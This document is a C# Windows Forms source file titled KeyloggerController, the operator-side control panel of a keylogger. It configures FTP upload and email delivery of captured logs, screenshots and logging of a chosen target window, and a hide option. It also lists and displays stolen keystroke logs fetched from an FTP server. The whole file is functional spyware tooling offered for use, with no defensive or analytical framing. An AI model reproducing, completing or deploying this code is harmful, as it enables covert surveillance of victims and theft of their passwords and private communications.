using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace KeyloggerController
{
    public partial class Form1 : Form
    {
        //Used to store the FTP settings
        private string strHost;
        private string strUser;
        private string strPass;

        //Used to store the email settings
        private static string strFromEmail, strEmailHost, strEmailPass;
        private static int intEmailPort;
        private string strReceipentUser;
        private string strScreenshotWindow;

        //Used to store the enable/disable settings
        private bool blTakeScreenshot;
        private bool blSpecificLogging;
        private bool blSendEmail;
        private bool blUploadFTP;

        //These two are set to values because they are checked on startup
        private bool blStartLog;
        private bool blHide;

        //Used to store the object gaining the json and its values
        private static classJsonObj.classJson objJson;

        public Form1()
        {
            InitializeComponent();
            doFirst();
        }

        public void doFirst()
        {
            objJson = classJsonObj.initializeObj();

            getSettings();
            getControls();
            setControls();
            refreshLogs();

            backgroundWorker1.RunWorkerAsync();
        }

        //Gets the current settings on startup only
        public void getSettings()
        {
            //Gets the FTP settings
            strHost = objJson.FTP.Host;
            strUser = objJson.FTP.User;
            strPass = objJson.FTP.Pass;

            //Gets the Email settings
            strEmailHost = objJson.Email.Host;
            strFromEmail = objJson.Email.FromEmail;
            intEmailPort = objJson.Email.Port;
            strEmailPass = objJson.Email.Pass;
            strReceipentUser = objJson.Email.ToEmail;
            strScreenshotWindow = objJson.Email.Window; //Used to check which window to screenshot and to specify logging, only works while email sending is enabled

            //Gets the Booleans for the program to function based on the Controller
            blTakeScreenshot = objJson.Check.TakeScreenshot;
            blSpecificLogging = objJson.Check.SpecificLogging;
            blSendEmail = objJson.Check.SendEmail;
            blUploadFTP = objJson.Check.UploadFTP;
            blStartLog = objJson.Check.Start;
            blHide = objJson.Check.Hide;
        }

        //Sets the controls based on the settings on startup
        public void setControls()
        {
            //Sets the FTP controls settings
            txtFTPHost.Text = strHost;
            txtFTPUser.Text = strUser;
            txtFTPPass.Text = strPass;

            //Sets the Email controls settings
            txtEmailHost.Text = strEmailHost;
            txtEmailFrom.Text = strFromEmail;
            txtEmailPort.Text = intEmailPort.ToString();
            txtEmailPass.Text = strEmailPass;
            txtEmailTo.Text = strReceipentUser;
            txtScreenshotWindow.Text = strScreenshotWindow;

            //Sets the Enable/Disable controls settings
            checkScreenshot.Checked = blTakeScreenshot;
            checkSpecific.Checked = blSpecificLogging;
            checkEmail.Checked = blSendEmail;
            checkFTP.Checked = blUploadFTP;
            checkHide.Checked = blHide;
        }

        //Sets the settings
        public void setSettings()
        {
            //Sends the FTP settings
            objJson.FTP.Host = strHost;
            objJson.FTP.User = strUser;
            objJson.FTP.Pass = strPass;

            //Sends the Email settings
            objJson.Email.Host = strEmailHost;
            objJson.Email.FromEmail = strFromEmail;
            objJson.Email.Port = intEmailPort;
            objJson.Email.Pass = strEmailPass;
            objJson.Email.ToEmail = strReceipentUser;
            objJson.Email.Window = strScreenshotWindow; //Used to check which window to screenshot and to specify logging, only works while email sending is enabled

            //Sends the Enable/Disable settings
            objJson.Check.TakeScreenshot = blTakeScreenshot;
            objJson.Check.SpecificLogging = blSpecificLogging;
            objJson.Check.SendEmail = blSendEmail;
            objJson.Check.UploadFTP = blUploadFTP;
            objJson.Check.Start = blStartLog;
            objJson.Check.Hide = blHide;

            //Checks if log has already started
            if (objJson.Check.Start == true)
            {
                statusChanger("Started"); //Indicates on the Cntroller it started
            }
            else //If not
            {
                statusChanger("Stopped"); //Indicates on the Cntroller it stopped
            }        
        }

        public void getControls()
        {
            //Enables/disable certain controls on startup based on the settings
            grpEmail.Enabled = blSendEmail;
            checkScreenshot.Enabled = blSendEmail;
            checkSpecific.Enabled = blSendEmail;

            //Checks if the Controller wants to log specifically or take a screenshot on a window
            if ((blTakeScreenshot == true) || (blSpecificLogging == true))
            {
                txtScreenshotWindow.Enabled = true;
            }
            else
            {
                txtScreenshotWindow.Enabled = false;
            }

            //Validates the FTP settings
            checkFTP.Enabled = validateFTP(strHost, strUser, strPass);
        }

        //Refreshes the list of logs
        public void refreshLogs()
        {
            classFTP.getLogs(lstLogs, strHost, strUser, strPass);
        }

        //Validates your FTP settings
        public bool validateFTP(string strHost, string strUser, string  strPass)
        {
            return classFTP.validateFTP(strHost, strUser, strPass);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            //Let you stop once started
            blStartLog = true;
            btnStop.Enabled = true;
            btnStart.Enabled = false;
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            //Let you start once stopped
            blStartLog = false;
            btnStart.Enabled = true;
            btnStop.Enabled = false;
        }

        private void statusChanger(String Status)
        {
            if (Status.Equals("Started"))
            { //Indicates the log started
                statusStrip1.BackColor = Color.LimeGreen;
                btnStart.Enabled = false;
                btnStop.Enabled = true;
            }
            else if (Status.Equals("Stopped"))
            { //Indicates the log hasn't started
                statusStrip1.BackColor = Color.Red;
                btnStart.Enabled = true;
                btnStop.Enabled = false;
            }
        }

        private void btnValidateFTP_Click(object sender, EventArgs e)
        {
            checkFTP.Enabled = validateFTP(strHost, strUser, strPass);
        }

        //Constantly saves the settings and serializes the json for any updates (1 second interval)
        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                setSettings();
                classJsonObj.exportObj(objJson);
                Thread.Sleep(1000);
            }
        }

        private void checkFTP_CheckedChanged(object sender, EventArgs e)
        {
            blUploadFTP = checkFTP.Checked;         
        }

        private void checkEmail_CheckedChanged(object sender, EventArgs e)
        {
            blSendEmail = checkEmail.Checked;

            //Allows the user to send an email and take screenshots and log specifically, only if email is enabled
            checkScreenshot.Enabled = blSendEmail;
            checkSpecific.Enabled = blSendEmail;
            grpEmail.Enabled = blSendEmail;
        }

        private void checkScreenshot_CheckedChanged(object sender, EventArgs e)
        {
            blTakeScreenshot = checkScreenshot.Checked;
            txtScreenshotWindow.Enabled = blTakeScreenshot;
        }

        private void checkSpecific_CheckedChanged(object sender, EventArgs e)
        {
            blSpecificLogging = checkSpecific.Checked;
            txtScreenshotWindow.Enabled = blSpecificLogging;
        }

        private void checkHide_CheckedChanged(object sender, EventArgs e)
        {
            blHide = checkHide.Checked;
        }

        private void txtFTPUser_TextChanged(object sender, EventArgs e)
        {
            strUser = txtFTPUser.Text;
        }

        private void txtFTPHost_TextChanged(object sender, EventArgs e)
        {
            strHost = txtFTPHost.Text;
        }

        private void txtFTPPass_TextChanged(object sender, EventArgs e)
        {
            strPass = txtFTPPass.Text;
        }

        private void txtEmailHost_TextChanged(object sender, EventArgs e)
        {
            strEmailHost = txtEmailHost.Text;
        }

        private void txtEmailFrom_TextChanged(object sender, EventArgs e)
        {
            strFromEmail = txtEmailFrom.Text;
        }

        private void txtEmailPort_TextChanged(object sender, EventArgs e)
        {
            intEmailPort = int.Parse(txtEmailPort.Text);
        }

        private void txtEmailPass_TextChanged(object sender, EventArgs e)
        {
            strEmailPass = txtEmailPass.Text;
        }

        private void txtEmailTo_TextChanged(object sender, EventArgs e)
        {
            strReceipentUser = txtEmailTo.Text;
        }

        private void txtScreenshotWindow_TextChanged(object sender, EventArgs e)
        {
            strScreenshotWindow = txtScreenshotWindow.Text;
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            refreshLogs();
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            classJsonObj.updateLocalJson(objJson); //Updates the local json, but when form is closed to avoid conflict
        }

        //When a log is doubleclicked
        private void lstLogs_DoubleClick(object sender, EventArgs e)
        {
            viewLog();   
        }

        //To view the selected log
        private void viewLog()
        {
            if ((lstLogs.Items.Count > 0) && (lstLogs.SelectedIndex != -1)) //If the list isn't not empty, and a log is selected
            {
                string strLogName = lstLogs.SelectedItem.ToString(); //Set the log name to the selected log
                MessageBox.Show(classFTP.viewLog(strLogName, strHost, strUser, strPass), strLogName); //Gets and shows the log with the logname as its title
            }
        }
    }
}
